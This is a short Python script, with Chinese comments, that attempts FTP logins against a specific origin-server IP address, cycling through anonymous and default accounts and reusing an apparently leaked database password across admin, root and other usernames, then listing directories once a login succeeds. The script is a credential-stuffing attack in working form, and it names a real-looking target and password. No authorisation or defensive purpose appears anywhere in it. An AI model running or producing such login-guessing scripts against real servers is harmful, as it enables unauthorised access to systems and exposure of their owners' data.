#!/usr/bin/env python3
"""ftp_test.py - 测试源站208.87.129.186的FTP登录"""
import ftplib, socket

HOST = '208.87.129.186'

# 测试匿名 + 密码复用
attempts = [
    ('anonymous', 'anonymous'),
    ('anonymous', ''),
    ('ftp', 'ftp'),
    ('macro_us1', 'JCVQXk7Hre'),  # 数据库凭据复用
    ('macro_us1', 'JCVQXk7Hre'),
    ('admin', 'admin'),
    ('admin', 'JCVQXk7Hre'),
    ('root', 'JCVQXk7Hre'),
    ('vectorcode', 'JCVQXk7Hre'),
    ('macro', 'JCVQXk7Hre'),
]

for user, pw in attempts:
    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, 21, timeout=10)
        resp = ftp.login(user, pw)
        print('[成功] %s/%s -> %s' % (user, pw, resp))
        # 列出目录
        try:
            ftp.retrlines('LIST')
        except Exception as e:
            print('  LIST失败:', e)
        ftp.quit()
        break
    except ftplib.error_perm as e:
        print('[失败] %s/%s -> %s' % (user, pw, str(e)[:60]))
    except Exception as e:
        print('[错误] %s/%s -> %s' % (user, pw, str(e)[:60]))
